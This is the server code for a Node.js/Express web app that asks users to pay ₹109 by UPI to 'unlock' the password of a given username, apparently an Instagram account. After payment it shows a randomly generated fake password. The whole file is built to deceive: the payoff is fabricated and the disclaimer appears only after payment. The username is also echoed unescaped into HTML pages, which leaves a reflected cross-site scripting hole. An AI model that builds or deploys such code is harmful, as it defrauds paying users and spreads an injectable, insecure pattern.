const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Load environment variables
require('dotenv').config();

const {
    MERCHANT_ID,
    API_KEY
} = process.env;

app.use(express.static(__dirname));
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Serve index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Show payment page
app.get('/payment', (req, res) => {
    const username = req.query.username || 'user';
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Payment Required</title>
            <link rel="stylesheet" href="/style.css">
        </head>
        <body>
            <div class="container">
                <h2>Unlock Your Password 🔑</h2>
                <p>To view the password for <strong>${username}</strong>, pay ₹109 using UPI.</p>
                <form action="/fastzix/initiate" method="POST">
                    <input type="hidden" name="username" value="${username}">
                    <button type="submit">Proceed to Payment</button>
                </form>
            </div>
        </body>
        </html>
    `);
});

// Generate X-VERIFY Signature
function generateXVerify(data, secretKey) {
    const sortedKeys = Object.keys(data).sort();
    const dataString = sortedKeys.map(k => `${k}=${data[k]}`).join('|');
    return crypto.createHmac('sha256', secretKey).update(dataString).digest('hex');
}

// Initiate FastZix Payment
app.post('/fastzix/initiate', async (req, res) => {
    const username = req.body.username.trim().replace(/[^a-zA-Z0-9]/g, ''); // Remove special characters
    const orderId = `ORD${Math.floor(Date.now() / 1000)}`;
    const amount = 109; // Changed from 99 to 109

    const requestData = {
        customer_mobile: 9999999999,
        merch_id: MERCHANT_ID,
        amount: amount,
        order_id: orderId,
        currency: "INR",
        redirect_url: `http://localhost:${PORT}/success?username=${encodeURIComponent(username)}`,
        udf1: username.replace(/[^a-zA-Z0-9]/g, ''), // alphanumeric only
        udf2: "InstaPass",     // valid alphanumeric
        udf3: "UnlockTool",    // valid alphanumeric
        udf4: "WebAppV2",      // valid alphanumeric
        udf5: "DemoOnly"       // valid alphanumeric
    };

    const xVerify = generateXVerify(requestData, API_KEY);

    try {
        const response = await axios.post("https://fastzix.in/api/v1/order", requestData, {
            headers: {
                "Content-Type": "application/json",
                "X-VERIFY": xVerify
            }
        });

        if (response.data && response.data.result && response.data.result.payment_url) {
            res.redirect(response.data.result.payment_url);
        } else {
            throw new Error("No payment URL received");
        }

    } catch (error) {
        console.error("🚨 Payment Error:");
        if (error.response) {
            console.error("Status Code:", error.response.status);
            console.error("Response Data:", error.response.data);
            res.status(error.response.status).send(`
                <h2>❌ Failed to create payment link</h2>
                <p>Please check terminal for details.</p>
                <pre>${JSON.stringify(error.response.data, null, 2)}</pre>
            `);
        } else if (error.request) {
            console.error("No response from server.");
            res.status(504).send("No response from FastZix server.");
        } else {
            console.error("Error Message:", error.message);
            res.status(500).send("Internal Server Error");
        }
    }
});

// Show fake password after payment
app.get('/success', (req, res) => {
    const username = req.query.username || 'user';
    const fakePassword = generateFakePassword(username);

    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Password Found!</title>
            <link rel="stylesheet" href="/style.css">
        </head>
        <body>
            <div class="container">
                <h2>✅ Password Successfully Found</h2>
                <p><strong>Username:</strong> <span>${username}</span></p>
                <p><strong>Password:</strong> <span style="color:#00ff00;">${fakePassword}</span></p>
                <p>⚠️ This is a demo password generated for entertainment purposes only.</p>
            </div>
        </body>
        </html>
    `);
});

// Internal Fake Password Generator
function generateFakePassword(user) {
    const chars = "!@#$%^&*";
    const nums = "0123456789";
    return user +
           nums[Math.floor(Math.random() * nums.length)] +
           chars[Math.floor(Math.random() * chars.length)] +
           Math.floor(Math.random() * 99);
}

// Webhook Endpoint (Optional - For Auto Verify)
app.post('/fastzix/webhook', (req, res) => {
    const data = req.body;

    if (data.status === true && data.result?.txnStatus === "SUCCESS") {
        console.log("✅ Payment Successful for Order ID:", data.result.order_id);
        console.log("🔓 Unlock password for user:", data.result.udf1);
    }

    res.sendStatus(200); // Acknowledge receipt
});

// Start Server
app.listen(PORT, () => {
    console.log(`✅ Server running at http://localhost:${PORT}`);
});